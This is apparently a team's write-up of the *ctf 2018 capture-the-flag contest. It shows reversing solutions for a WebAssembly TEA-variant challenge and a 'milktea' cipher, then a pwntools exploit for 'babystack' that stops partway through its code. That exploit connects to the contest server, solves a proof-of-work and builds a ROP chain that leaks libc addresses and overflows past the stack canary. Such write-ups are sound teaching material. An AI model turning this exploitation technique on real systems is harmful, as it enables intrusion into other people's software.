# *ctf 2018


**It's recommended to read our responsive [web version](https://balsn.github.io/ctf_writeup/20180421-*ctf/) of this writeup.**


 - [*ctf 2018](#ctf-2018)
   - [rev](#rev)
     - [wasm (sces60107)](#wasm-sces60107)
     - [milktea (sasdf)](#milktea-sasdf)
   - [pwn](#pwn)
     - [babystack (sces60107)](#babystack-sces60107)
     - [note (sces60107)](#note-sces60107)
     - [young_heap (4w4rd sces60107)](#young_heap-4w4rd-sces60107)
   - [web](#web)
     - [simpleweb (how2hack)](#simpleweb-how2hack)
   - [misc](#misc)
     - [welcome (bookgin)](#welcome-bookgin)
     - [warmup (sces60107)](#warmup-sces60107)
   - [ppc](#ppc)
     - [magic_number (b04902036)](#magic_number-b04902036)
     - [Chess Master (bookgin)](#chess-master-bookgin)
   - [crypto](#crypto)
     - [primitive (sasdf)](#primitive-sasdf)
     - [ssss (sasdf)](#ssss-sasdf)
     - [ssss2 (sasdf)](#ssss2-sasdf)



The official repository is [here](https://github.com/sixstars/starctf2018)

## rev

### wasm (sces60107)

I leverage [wasm2c](https://github.com/WebAssembly/wabt) to decomplie this wasm

Then I found some interesting function and data

```c=
static const u8 data_segment_data_0[] = {
  0x99, 0x00, 0x00, 0x00, 0x77, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
  0xbd, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x00, 0x00, 0x6c, 0x00, 0x00, 0x00, 
  0x87, 0x00, 0x00, 0x00, 0x35, 0x00, 0x00, 0x00, 0x55, 0x00, 0x00, 0x00, 
  0x22, 0x00, 0x00, 0x00, 0x79, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x00, 0x00, 
  0xf6, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 
  0x8c, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0xd6, 0x00, 0x00, 0x00, 
  0x13, 0x00, 0x00, 0x00, 0x93, 0x00, 0x00, 0x00, 0xcb, 0x00, 0x00, 0x00, 
  0xd8, 0x00, 0x00, 0x00, 0x31, 0x00, 0x00, 0x00, 0xe3, 0x00, 0x00, 0x00, 
  0x77, 0x65, 0x62, 0x61, 0x73, 0x6d, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x73, 
  0x74, 0x69, 0x6e, 0x67, 
};

static void init_memory(void) {
  memcpy(&((*Z_envZ_memory).data[(*Z_envZ_memoryBaseZ_i)]), data_segment_data_0, 112);
}
static void init_table(void) {
  uint32_t offset;
  offset = (*Z_envZ_tableBaseZ_i);
  (*Z_envZ_table).data[offset + 0] = (wasm_rt_elem_t){func_types[6], (wasm_rt_anyfunc_t)(&f15)};
  (*Z_envZ_table).data[offset + 1] = (wasm_rt_elem_t){func_types[4], (wasm_rt_anyfunc_t)(&_EncryptCBC)};
  (*Z_envZ_table).data[offset + 2] = (wasm_rt_elem_t){func_types[1], (wasm_rt_anyfunc_t)(&_check)};
  (*Z_envZ_table).data[offset + 3] = (wasm_rt_elem_t){func_types[6], (wasm_rt_anyfunc_t)(&f15)};
}
static void _EncryptCBC(u32 p0, u32 p1, u32 p2, u32 p3) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, 
      l8 = 0, l9 = 0, l10 = 0, l11 = 0, l12 = 0, l13 = 0, l14 = 0, l15 = 0, 
      l16 = 0, l17 = 0, l18 = 0, l19 = 0, l20 = 0, l21 = 0, l22 = 0, l23 = 0, 
      l24 = 0, l25 = 0, l26 = 0, l27 = 0, l28 = 0, l29 = 0, l30 = 0, l31 = 0, 
      l32 = 0, l33 = 0, l34 = 0, l35 = 0, l36 = 0, l37 = 0, l38 = 0, l39 = 0, 
      l40 = 0, l41 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1;
  i0 = g10;
  l41 = i0;
  i0 = g10;
  i1 = 48u;
  i0 += i1;
  g10 = i0;
  i0 = g10;
  i1 = g11;
  i0 = (u32)((s32)i0 >= (s32)i1);
  if (i0) {
    i0 = 48u;
    (*Z_envZ_abortStackOverflowZ_vi)(i0);
  }
  i0 = l41;
  i1 = 16u;
  i0 += i1;
  l38 = i0;
  i0 = l41;
  l39 = i0;
  i0 = p0;
  l30 = i0; l30=p0
  i0 = p1;
  l35 = i0; l35=p1
  i0 = p2;
  l36 = i0; l36=p2
  i0 = p3;
  l37 = i0; l37=p3
  i0 = l37; 
  l0 = i0;
  i0 = l0;
  i0 = f9(i0);  round key
  l1 = i0;
  i0 = l39;
  i1 = l1;
  i32_store(Z_envZ_memory, (u64)(i0), i1);
  i0 = l37;
  l2 = i0;
  i0 = l2;
  i1 = 4u;
  i0 += i1;
  l3 = i0;
  i0 = l3;
  i0 = f9(i0);
  l4 = i0;
  i0 = l39;
  i1 = 4u;
  i0 += i1;
  l5 = i0;
  i0 = l5;
  i1 = l4;
  i32_store(Z_envZ_memory, (u64)(i0), i1);
  i0 = l37;
  l6 = i0;
  i0 = l6;
  i1 = 8u;
  i0 += i1;
  l7 = i0;
  i0 = l7;
  i0 = f9(i0);
  l8 = i0;
  i0 = l39;
  i1 = 8u;
  i0 += i1;
  l9 = i0;
  i0 = l9;
  i1 = l8;
  i32_store(Z_envZ_memory, (u64)(i0), i1);
  i0 = l37;
  l10 = i0;
  i0 = l10;
  i1 = 12u;
  i0 += i1;
  l11 = i0;
  i0 = l11;
  i0 = f9(i0);
  l12 = i0;
  i0 = l39;
  i1 = 12u;
  i0 += i1;
  l13 = i0;
  i0 = l13;
  i1 = l12;
  i32_store(Z_envZ_memory, (u64)(i0), i1);
  L1: 
    i0 = l36;
    l14 = i0;
    i0 = l14;
    i1 = 8u;
    i0 = (u32)((s32)i0 >= (s32)i1);
    l15 = i0;
    i0 = l15;
    i0 = !(i0);
    if (i0) {
      goto B2;
    }
    i0 = l35;
    l16 = i0;
    i0 = l16;
    i0 = f9(i0);
    l17 = i0;
    i0 = l38;
    i1 = l17;
    i32_store(Z_envZ_memory, (u64)(i0), i1);
    i0 = l35;
    l18 = i0;
    i0 = l18;
    i1 = 4u;
    i0 += i1;
    l19 = i0;
    i0 = l19;
    i0 = f9(i0);
    l20 = i0;
    i0 = l38;
    i1 = 4u;
    i0 += i1;
    l21 = i0;
    i0 = l21;
    i1 = l20;
    i32_store(Z_envZ_memory, (u64)(i0), i1);
    i0 = l38;
    i1 = l39;
    f10(i0, i1);
    i0 = l30;
    l22 = i0;
    i0 = l38;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l23 = i0;
    i0 = l22;
    i1 = l23;
    f11(i0, i1);
    i0 = l30;
    l24 = i0;
    i0 = l24;
    i1 = 4u;
    i0 += i1;
    l25 = i0;
    i0 = l38;
    i1 = 4u;
    i0 += i1;
    l26 = i0;
    i0 = l26;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l27 = i0;
    i0 = l25;
    i1 = l27;
    f11(i0, i1);
    i0 = l35;
    l28 = i0;
    i0 = l28;
    i1 = 8u;
    i0 += i1;
    l29 = i0;
    i0 = l29;
    l35 = i0;
    i0 = l30;
    l31 = i0;
    i0 = l31;
    i1 = 8u;
    i0 += i1;
    l32 = i0;
    i0 = l32;
    l30 = i0;
    i0 = l36;
    l33 = i0;
    i0 = l33;
    i1 = 8u;
    i0 -= i1;
    l34 = i0;
    i0 = l34;
    l36 = i0;
    goto L1;
    B2:;
  i0 = l41;
  g10 = i0;
  goto Bfunc;
  Bfunc:;
  FUNC_EPILOGUE;
}

static u32 f9(u32 p0) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, 
      l8 = 0, l9 = 0, l10 = 0, l11 = 0, l12 = 0, l13 = 0, l14 = 0, l15 = 0, 
      l16 = 0, l17 = 0, l18 = 0, l19 = 0, l20 = 0, l21 = 0, l22 = 0, l23 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1;
  i0 = g10;
  l23 = i0;
  i0 = g10;
  i1 = 16u;
  i0 += i1;
  g10 = i0;
  i0 = g10;
  i1 = g11;
  i0 = (u32)((s32)i0 >= (s32)i1);
  if (i0) {
    i0 = 16u;
    (*Z_envZ_abortStackOverflowZ_vi)(i0);
  }
  i0 = p0;
  l0 = i0;
  i0 = l0;
  l11 = i0;
  i0 = l11; l11=p0
  i0 = i32_load8_s(Z_envZ_memory, (u64)(i0));
  l15 = i0;
  i0 = l15;
  i1 = 255u;
  i0 &= i1;
  l16 = i0;
  i0 = l0;
  l17 = i0;
  i0 = l17;
  i1 = 1u;
  i0 += i1;
  l18 = i0;
  i0 = l18;
  i0 = i32_load8_s(Z_envZ_memory, (u64)(i0));
  l19 = i0;
  i0 = l19;
  i1 = 255u;
  i0 &= i1;
  l20 = i0;
  i0 = l20;
  i1 = 8u;
  i0 <<= (i1 & 31);
  l21 = i0;
  i0 = l16;
  i1 = l21;
  i0 |= i1;
  l1 = i0;
  i0 = l0;
  l2 = i0;
  i0 = l2;
  i1 = 2u;
  i0 += i1;
  l3 = i0;
  i0 = l3;
  i0 = i32_load8_s(Z_envZ_memory, (u64)(i0));
  l4 = i0;
  i0 = l4;
  i1 = 255u;
  i0 &= i1;
  l5 = i0;
  i0 = l5;
  i1 = 16u;
  i0 <<= (i1 & 31);
  l6 = i0;
  i0 = l1;
  i1 = l6;
  i0 |= i1;
  l7 = i0;
  i0 = l0;
  l8 = i0;
  i0 = l8;
  i1 = 3u;
  i0 += i1;
  l9 = i0;
  i0 = l9;
  i0 = i32_load8_s(Z_envZ_memory, (u64)(i0));
  l10 = i0;
  i0 = l10;
  i1 = 255u;
  i0 &= i1;
  l12 = i0;
  i0 = l12;
  i1 = 24u;
  i0 <<= (i1 & 31);
  l13 = i0;
  i0 = l7;
  i1 = l13;
  i0 |= i1;
  l14 = i0;
  i0 = l23;
  g10 = i0;
  i0 = l14;
  goto Bfunc;
  Bfunc:;
  FUNC_EPILOGUE;
  return i0;
}

static void f10(u32 p0, u32 p1) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, 
      l8 = 0, l9 = 0, l10 = 0, l11 = 0, l12 = 0, l13 = 0, l14 = 0, l15 = 0, 
      l16 = 0, l17 = 0, l18 = 0, l19 = 0, l20 = 0, l21 = 0, l22 = 0, l23 = 0, 
      l24 = 0, l25 = 0, l26 = 0, l27 = 0, l28 = 0, l29 = 0, l30 = 0, l31 = 0, 
      l32 = 0, l33 = 0, l34 = 0, l35 = 0, l36 = 0, l37 = 0, l38 = 0, l39 = 0, 
      l40 = 0, l41 = 0, l42 = 0, l43 = 0, l44 = 0, l45 = 0, l46 = 0, l47 = 0, 
      l48 = 0, l49 = 0, l50 = 0, l51 = 0, l52 = 0, l53 = 0, l54 = 0, l55 = 0, 
      l56 = 0, l57 = 0, l58 = 0, l59 = 0, l60 = 0, l61 = 0, l62 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1;
  i0 = g10;
  l62 = i0;
  i0 = g10;
  i1 = 32u;
  i0 += i1;
  g10 = i0;
  i0 = g10;
  i1 = g11;
  i0 = (u32)((s32)i0 >= (s32)i1);
  if (i0) {
    i0 = 32u;
    (*Z_envZ_abortStackOverflowZ_vi)(i0);
  }
  i0 = p0;
  l10 = i0;
  i0 = p1;
  l21 = i0;
  i0 = 2654435769u;
  l32 = i0;
  i0 = 0u;
  l43 = i0;
  i0 = 0u;
  l54 = i0;
  L1: 
    i0 = l54;
    l58 = i0;
    i0 = l58;
    i1 = 32u;
    i0 = i0 < i1;
    l59 = i0;
    i0 = l59;
    i0 = !(i0);
    if (i0) {
      goto B2;
    }
    i0 = l32;
    l60 = i0;
    i0 = l43;
    l0 = i0;
    i0 = l0;
    i1 = l60;
    i0 += i1;
    l1 = i0;
    i0 = l1;
    l43 = i0;
    i0 = l10;
    l2 = i0;
    i0 = l2;
    i1 = 4u;
    i0 += i1;
    l3 = i0;
    i0 = l3;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l4 = i0;
    i0 = l4;
    i1 = 3u;
    i0 <<= (i1 & 31);
    l5 = i0;
    i0 = l21;
    l6 = i0;
    i0 = l6;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l7 = i0;
    i0 = l5;
    i1 = l7;
    i0 ^= i1;
    l8 = i0;
    i0 = l10;
    l9 = i0;
    i0 = l9;
    i1 = 4u;
    i0 += i1;
    l11 = i0;
    i0 = l11;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l12 = i0;
    i0 = l43;
    l13 = i0;
    i0 = l12;
    i1 = l13;
    i0 += i1;
    l14 = i0;
    i0 = l8;
    i1 = l14;
    i0 ^= i1;
    l15 = i0;
    i0 = l10;
    l16 = i0;
    i0 = l16;
    i1 = 4u;
    i0 += i1;
    l17 = i0;
    i0 = l17;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l18 = i0;
    i0 = l18;
    i1 = 5u;
    i0 >>= (i1 & 31);
    l19 = i0;
    i0 = l21;
    l20 = i0;
    i0 = l20;
    i1 = 4u;
    i0 += i1;
    l22 = i0;
    i0 = l22;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l23 = i0;
    i0 = l19;
    i1 = l23;
    i0 += i1;
    l24 = i0;
    i0 = l15;
    i1 = l24;
    i0 ^= i1;
    l25 = i0;
    i0 = l10;
    l26 = i0;
    i0 = l26;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l27 = i0;
    i0 = l27;
    i1 = l25;
    i0 += i1;
    l28 = i0;
    i0 = l26;
    i1 = l28;
    i32_store(Z_envZ_memory, (u64)(i0), i1);
    i0 = l10;
    l29 = i0;
    i0 = l29;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l30 = i0;
    i0 = l30;
    i1 = 3u;
    i0 <<= (i1 & 31);
    l31 = i0;
    i0 = l21;
    l33 = i0;
    i0 = l33;
    i1 = 8u;
    i0 += i1;
    l34 = i0;
    i0 = l34;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l35 = i0;
    i0 = l31;
    i1 = l35;
    i0 ^= i1;
    l36 = i0;
    i0 = l10;
    l37 = i0;
    i0 = l37;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l38 = i0;
    i0 = l43;
    l39 = i0;
    i0 = l38;
    i1 = l39;
    i0 += i1;
    l40 = i0;
    i0 = l36;
    i1 = l40;
    i0 ^= i1;
    l41 = i0;
    i0 = l10;
    l42 = i0;
    i0 = l42;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l44 = i0;
    i0 = l44;
    i1 = 5u;
    i0 >>= (i1 & 31);
    l45 = i0;
    i0 = l21;
    l46 = i0;
    i0 = l46;
    i1 = 12u;
    i0 += i1;
    l47 = i0;
    i0 = l47;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l48 = i0;
    i0 = l45;
    i1 = l48;
    i0 += i1;
    l49 = i0;
    i0 = l41;
    i1 = l49;
    i0 ^= i1;
    l50 = i0;
    i0 = l10;
    l51 = i0;
    i0 = l51;
    i1 = 4u;
    i0 += i1;
    l52 = i0;
    i0 = l52;
    i0 = i32_load(Z_envZ_memory, (u64)(i0));
    l53 = i0;
    i0 = l53;
    i1 = l50;
    i0 += i1;
    l55 = i0;
    i0 = l52;
    i1 = l55;
    i32_store(Z_envZ_memory, (u64)(i0), i1);
    i0 = l54;
    l56 = i0;
    i0 = l56;
    i1 = 1u;
    i0 += i1;
    l57 = i0;
    i0 = l57;
    l54 = i0;
    goto L1;
    B2:;
  i0 = l62;
  g10 = i0;
  goto Bfunc;
  Bfunc:;
  FUNC_EPILOGUE;
}

static void f11(u32 p0, u32 p1) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, 
      l8 = 0, l9 = 0, l10 = 0, l11 = 0, l12 = 0, l13 = 0, l14 = 0, l15 = 0, 
      l16 = 0, l17 = 0, l18 = 0, l19 = 0, l20 = 0, l21 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1;
  i0 = g10;
  l21 = i0;
  i0 = g10;
  i1 = 16u;
  i0 += i1;
  g10 = i0;
  i0 = g10;
  i1 = g11;
  i0 = (u32)((s32)i0 >= (s32)i1);
  if (i0) {
    i0 = 16u;
    (*Z_envZ_abortStackOverflowZ_vi)(i0);
  }
  i0 = p0;
  l10 = i0;
  i0 = p1;
  l13 = i0;
  i0 = l13;
  l14 = i0;
  i0 = l14;
  i1 = 255u;
  i0 &= i1;
  l15 = i0;
  i0 = l10;
  l16 = i0;
  i0 = l16;
  i1 = l15;
  i32_store8(Z_envZ_memory, (u64)(i0), i1);
  i0 = l13;
  l17 = i0;
  i0 = l17;
  i1 = 8u;
  i0 >>= (i1 & 31);
  l18 = i0;
  i0 = l18;
  i1 = 255u;
  i0 &= i1;
  l19 = i0;
  i0 = l10;
  l0 = i0;
  i0 = l0;
  i1 = 1u;
  i0 += i1;
  l1 = i0;
  i0 = l1;
  i1 = l19;
  i32_store8(Z_envZ_memory, (u64)(i0), i1);
  i0 = l13;
  l2 = i0;
  i0 = l2;
  i1 = 16u;
  i0 >>= (i1 & 31);
  l3 = i0;
  i0 = l3;
  i1 = 255u;
  i0 &= i1;
  l4 = i0;
  i0 = l10;
  l5 = i0;
  i0 = l5;
  i1 = 2u;
  i0 += i1;
  l6 = i0;
  i0 = l6;
  i1 = l4;
  i32_store8(Z_envZ_memory, (u64)(i0), i1);
  i0 = l13;
  l7 = i0;
  i0 = l7;
  i1 = 24u;
  i0 >>= (i1 & 31);
  l8 = i0;
  i0 = l8;
  i1 = 255u;
  i0 &= i1;
  l9 = i0;
  i0 = l10;
  l11 = i0;
  i0 = l11;
  i1 = 3u;
  i0 += i1;
  l12 = i0;
  i0 = l12;
  i1 = l9;
  i32_store8(Z_envZ_memory, (u64)(i0), i1);
  i0 = l21;
  g10 = i0;
  goto Bfunc;
  Bfunc:;
  FUNC_EPILOGUE;
}

static u32 _check(u32 p0) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, 
      l8 = 0, l9 = 0, l10 = 0, l11 = 0, l12 = 0, l13 = 0, l14 = 0, l15 = 0, 
      l16 = 0, l17 = 0, l18 = 0, l19 = 0, l20 = 0, l21 = 0, l22 = 0, l23 = 0, 
      l24 = 0, l25 = 0, l26 = 0, l27 = 0, l28 = 0, l29 = 0, l30 = 0, l31 = 0, 
      l32 = 0, l33 = 0, l34 = 0, l35 = 0, l36 = 0, l37 = 0, l38 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1, i2, i3;
  i0 = g10;
  l36 = i0;
  i0 = g10;
  i1 = 160u;
  i0 += i1;
  g10 = i0;
  i0 = g10;
  i1 = g11;
  i0 = (u32)((s32)i0 >= (s32)i1);
  if (i0) {
    i0 = 160u;
    (*Z_envZ_abortStackOverflowZ_vi)(i0);
  }
  i0 = l36;
  i1 = 144u;
  i0 += i1;
  l22 = i0;
  i0 = l36;
  i1 = 120u;
  i0 += i1;
  l28 = i0;
  i0 = l36;
  i1 = 8u;
  i0 += i1;
  l30 = i0;
  i0 = p0;
  l11 = i0;
  i0 = l11;
  l32 = i0;
  i0 = l32;
  i0 = (*Z_envZ__strlenZ_ii)(i0);
  l33 = i0;
  i0 = l33;
  i1 = 24u;
  i0 = i0 != i1;
  l1 = i0;
  i0 = l1;
  if (i0) {
    i0 = 0u;
    l0 = i0;
    i0 = l0;
    l27 = i0;
    i0 = l36;
    g10 = i0;
    i0 = l27;
    goto Bfunc;
  }
  i0 = l22;
  l34 = i0;
  i0 = (*Z_envZ_memoryBaseZ_i);
  i1 = 96u;
  i0 += i1;
  l37 = i0;
  i0 = l34; 144
  i1 = 16u;
  i0 += i1;
  l38 = i0;
  L2: 
    i0 = l34;
    i1 = l37;
    i1 = i32_load8_s(Z_envZ_memory, (u64)(i1));
    i32_store8(Z_envZ_memory, (u64)(i0), i1);
    i0 = l34;
    i1 = 1u;
    i0 += i1;
    l34 = i0;
    i0 = l37;
    i1 = 1u;
    i0 += i1;
    l37 = i0;
    i0 = l34;
    i1 = l38;
    i0 = (u32)((s32)i0 < (s32)i1);
    if (i0) {goto L2;}
  i0 = l11;
  l2 = i0;
  i0 = l28; 120
  i1 = l2;  plaintext
  i2 = 4u;  4
  i3 = l22; 144 key?
  _EncryptCBC(i0, i1, i2, i3);
  i0 = 0u;
  l29 = i0;
  i0 = l30;
  l34 = i0;
  i0 = (*Z_envZ_memoryBaseZ_i);
  i1 = 0u;
  i0 += i1;
  l37 = i0;
  i0 = l34;
  i1 = 96u;
  i0 += i1;
  l38 = i0;
  L3: 
    i0 = l34;
    i1 = l37;
    i1 = i32_load(Z_envZ_memory, (u64)(i1));
    i32_store(Z_envZ_memory, (u64)(i0), i1);
    i0 = l34;
    i1 = 4u;
    i0 += i1;
    l34 = i0;
    i0 = l37;
    i1 = 4u;
    i0 += i1;
    l37 = i0;
    i0 = l34;
    i1 = l38;
    i0 = (u32)((s32)i0 < (s32)i1);
    if (i0) {goto L3;}
  i0 = 0u;
  l29 = i0;
  L4: 
    i0 = l29;
    l3 = i0;
    i0 = l3;
    i1 = 3u;
    i0 = (u32)((s32)i0 < (s32)i1);
    l4 = i0;
    i0 = l4;
    i0 = !(i0);
    if (i0) {
      i0 = 11u;
      l35 = i0;
      goto B5;
    }
    i0 = 0u;
    l31 = i0;
    L7: 
      i0 = l31;
      l5 = i0;
      i0 = l5;
      i1 = 8u;
      i0 = (u32)((s32)i0 < (s32)i1);
      l6 = i0;
      i0 = l29;
      l7 = i0;
      i0 = l6;
      i0 = !(i0);
      if (i0) {
        goto B8;
      }
      i0 = l7;
      i1 = 3u;
      i0 <<= (i1 & 31);
      l8 = i0;
      i0 = l31;
      l9 = i0;
      i0 = l8;
      i1 = l9;
      i0 += i1;
      l10 = i0;
      i0 = l28;
      i1 = l10;
      i0 += i1;
      l12 = i0;
      i0 = l12;
      i0 = i32_load8_s(Z_envZ_memory, (u64)(i0));
      l13 = i0;
      i0 = l13;
      i1 = 255u;
      i0 &= i1;
      l14 = i0;
      i0 = l29;
      l15 = i0;
      i0 = l15;
      i1 = 3u;
      i0 <<= (i1 & 31);
      l16 = i0;
      i0 = l16;
      i1 = 7u;
      i0 += i1;
      l17 = i0;
      i0 = l31;
      l18 = i0;
      i0 = l17;
      i1 = l18;
      i0 -= i1;
      l19 = i0;
      i0 = l30; cipher
      i1 = l19;
      i2 = 2u;
      i1 <<= (i2 & 31);
      i0 += i1;
      l20 = i0;
      i0 = l20;
      i0 = i32_load(Z_envZ_memory, (u64)(i0));
      l21 = i0;
      i0 = l14;
      i1 = l21; cipher[pos]
      i0 = i0 != i1;
      l23 = i0;
      i0 = l23;
      if (i0) {
        i0 = 8u;
        l35 = i0;
        goto B5;
      }
      i0 = l31;
      l24 = i0;
      i0 = l24;
      i1 = 1u;
      i0 += i1;
      l25 = i0;
      i0 = l25;
      l31 = i0;
      goto L7;
      B8:;
    i0 = l7;
    i1 = 1u;
    i0 += i1;
    l26 = i0;
    i0 = l26;
    l29 = i0;
    goto L4;
    B5:;
  i0 = l35;
  i1 = 8u;
  i0 = i0 == i1;
  if (i0) {
    i0 = 0u;
    l0 = i0;
    i0 = l0;
    l27 = i0;
    i0 = l36;
    g10 = i0;
    i0 = l27;
    goto Bfunc;
  } else {
    i0 = l35;
    i1 = 11u;
    i0 = i0 == i1;
    if (i0) {
      i0 = 1u;
      l0 = i0;
      i0 = l0;
      l27 = i0;
      i0 = l36;
      g10 = i0;
      i0 = l27;
      goto Bfunc;
    }
  }
  i0 = 0u;
  goto Bfunc;
  Bfunc:;
  FUNC_EPILOGUE;
  return i0;
}
```
The first thing come out in my mind is that It's [TEA](https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm).

But there some difference. The encryption function in this challenge is
```c=
void encrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i < 32; i++) {                       /* basic cycle start */
        sum += delta;
        v0 += ((v1<<3) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<3) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}
```
Now it's easy to write a decryption script
```python=
from pwn import *
A=[0x99, 0x00, 0x00, 0x00, 0x77, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
  0xbd, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x00, 0x00, 0x6c, 0x00, 0x00, 0x00, 
  0x87, 0x00, 0x00, 0x00, 0x35, 0x00, 0x00, 0x00, 0x55, 0x00, 0x00, 0x00, 
  0x22, 0x00, 0x00, 0x00, 0x79, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x00, 0x00, 
  0xf6, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 
  0x8c, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0xd6, 0x00, 0x00, 0x00, 
  0x13, 0x00, 0x00, 0x00, 0x93, 0x00, 0x00, 0x00, 0xcb, 0x00, 0x00, 0x00, 
  0xd8, 0x00, 0x00, 0x00, 0x31, 0x00, 0x00, 0x00, 0xe3, 0x00, 0x00, 0x00]
def decrypt(v,k):
  v0=v[0]
  v1=v[1]
  asum=0xC6EF3720
  delta=0x9e3779b9
  k0=k[0]
  k1=k[1]
  k2=k[2]
  k3=k[3]
  for i in range(32) :                      
    v1 -= ((v0<<3) ^ k2) ^ (v0 + asum) ^ ((v0>>5) + k3)
    v1 %=(2**32)
    v0 -= ((v1<<3) ^ k0) ^ (v1 + asum) ^ ((v1>>5) + k1)
    v0 %=(2**32)
    asum -= delta
    asum %= (2**32)
  return v0,v1

cipher=[A[i] for i in range(0,len(A),4)]
cipher="".join(map(chr,cipher))

key="webasmintersting"
k=[u32(key[i:i+4]) for i in range(0,len(key),4)]


flag=""
for i in range(3):
  vv=cipher[i*8:(i+1)*8][::-1]
  v=[u32(vv[i:i+4]) for i in range(0,len(vv),4)]
  a,b=decrypt(v,k)
  flag+=p32(a)+p32(b)
print flag
# *ctf{web4ss3mbly_1s_god}
```

### milktea (sasdf)

```python=
import struct

with open('milktea', 'rb') as f:
    data = f.read()
    keys = data[0x10C0:0x11A8]
    ct = data[0x1080:0x10B8]
keys = struct.unpack('<' + 'I' * (len(keys) // 4), keys)
keys = [keys[i:i+2] for i in range(0, len(keys), 2)]
ct = struct.unpack('<' + 'I' * (len(ct) // 4), ct)

# Fake memcmp
xx = [
    0x0BF7AC52, 0x801135AA, 0x5341B12E, 0x8C284278, 
    0x879413EE, 0xF0D4BB6A, 0x3336515C, 0x1498DC7D, 
    0x0BE8AD86, 0x310FE5B8, 0x3DEEAFD4, 0x5603371B, 
    0x00000000, 0x00000000,
]
ct = [c ^ x for c, x in zip(ct, xx)]
ct = [ct[i:i+2] for i in range(0, len(ct), 2)]

sbox = [
    0x206D2749, 0x69622061, 0x61662067, 0x666F206E, 
    0x70657320, 0x6D657974, 0x37633634, 0x66336265, 
    0x63383538, 0x66373331, 0x66646239, 0x65356166, 
    0x38386630, 0x39386530, 0x62623935, 0x35366532, 
]

mask = 0xffffffff


# Encyption sanity check
low, = struct.unpack('<I', 'aaaa')
high = low

for key in keys:
    high = ( ( (key[0] + sbox[low & 0xF]) ^ (low + ((low >> 5) ^ (low << 4))) ) + high ) & mask
    low = ( ( (key[1] + sbox[high & 0xF]) ^ (high + ((high >> 5) ^ (high << 4))) ) + low ) & mask
res = low << 32 | high

assert(res == 0xd5c62ef45e60fe03)

# Decrypt flag
plain = ''
for c in ct:
    high, low = c
    for key in reversed(keys):
        low = ( low - ( (key[1] + sbox[high & 0xF]) ^ (high + ((high >> 5) ^ (high << 4))) ) ) & mask
        high = ( high - ( (key[0] + sbox[low & 0xF]) ^ (low + ((low >> 5) ^ (low << 4))) ) ) & mask
    res = high << 32 | low
    plain += struct.pack('<Q', res)
print(repr(plain))
```

## pwn

### babystack (sces60107)

In this challenge, you can overflow the stack canary.
So you won't trigger `__stack_chk_fail`

```python=
from pwn import *
import hashlib
import itertools
import string
import os
import time
r=remote("47.91.226.78", 10005)
#env = {'LD_PRELOAD': os.path.join(os.getcwd(),'./libc.so.6-56d992a0342a67a887b8dcaae381d2cc51205253')}
#r=process("./bs",env=env)
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(r)[0],'b *'+hex(0x400a9b)+'\nc\n')

def proofwork():
  r.recvuntil('sha256(xxxx+')
  a=r.recvline()
  print a
  proof=a.split(" ")[-1]
  x=a.split(")")[0]
  proof=proof.strip()
  print r.recvuntil("xxxx:\n")
  for i in itertools.product(string.ascii_letters+string.digits,repeat=4):
    test="".join(i)+x
    k=hashlib.sha256()
    k.update(test)
    if k.hexdigest()==proof:
      print "find"
      r.sendline("".join(i))
      break
proofwork()
     


main=0x4009e7
poprdi=0x400c03
poprsi=0x400c01
read=0x4007e0
atoigot=0x601ff0
putsgot=0x601fb0
putplt=0x4007c0
buf=0x602f00
leave=0x400955
p1=p64(poprdi)+p64(putsgot)+p64(putplt)
p2=p64(poprdi)+p64(0)+p64(poprsi)+p64(buf+0x8)+p64(0)+p64(read)+p64(leave)
payload=p1+p2

# You can overflow the stack canary, the stack canary offset is 0x6128
print r.recvuntil("How many bytes do you want to send?")
r.sendline(str(6128))
